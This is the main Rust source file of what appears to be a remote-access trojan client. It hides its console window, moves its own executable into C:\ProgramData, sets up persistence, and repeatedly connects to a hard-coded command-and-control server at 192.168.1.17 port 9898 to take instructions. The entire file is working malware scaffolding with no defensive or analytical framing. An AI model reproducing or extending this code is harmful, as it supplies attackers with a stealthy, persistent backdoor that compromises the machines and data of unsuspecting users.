#![windows_subsystem = "windows"]

mod connection_c2;
mod listen_c2;
mod persistent;

use std::{env::{consts::OS, current_exe}, net::Shutdown, process::Command, thread::{self, sleep, JoinHandle}, time::Duration};

use connection_c2::connection::connect_c2;
use listen_c2::listen::listen_c2;
use persistent::persistent::persistent;


struct ClientConfigs {
    timer_retry_connection_with_c2_secs : u64,
    ip_c2 : String,
    port : u32
}


fn main() {
    
    let client_configs = ClientConfigs {
        timer_retry_connection_with_c2_secs: 60 * 3, // 3 mins
        ip_c2 : String::from("192.168.1.17"), 
        port : 9898
    };

    if OS == "windows" {
        stealth_win(client_configs).join().unwrap();
    } else {
        client(client_configs);
    }
    
}

fn stealth_win(client_configs: ClientConfigs)  -> JoinHandle<()> {
    
    let new_location = "C:\\ProgramData";

    let current_path = current_exe().expect("erro in get current directory");
    let command = format!("cmd /C move \"{}\" \"{}\" ", current_path.display(), new_location);

    thread::spawn(move || {
        thread::sleep(Duration::from_secs(2));

                let result_comand = Command::new("cmd")
                    .args(&["/C", "move", &current_path.display().to_string(), new_location])
                    .output()
                    .expect("erro in move exe");
                

        let file_name = current_path.file_name().expect("err").to_string_lossy();
        let current_path_script =  format!("{}\\{}", new_location, file_name);
        persistent( current_path_script);
        client(client_configs);
    })
}

fn client(client_configs: ClientConfigs) {
    loop {

        println!("trying establish connection with c2 server...");

        let mut socket: std::net::TcpStream = match connect_c2(&client_configs.ip_c2, client_configs.port) {
            Ok(socket_connection) => socket_connection,
            Err(_) => {
                sleep(Duration::from_secs(client_configs.timer_retry_connection_with_c2_secs));
                continue;
            }
        };

        println!("connectd in c2 server with success");

        if let Some(e) = listen_c2(&mut socket).err() {
            println!("error {}",e);

            socket.shutdown(Shutdown::Both).unwrap();
            sleep(Duration::from_secs(client_configs.timer_retry_connection_with_c2_secs));
            continue;
        };
    }

}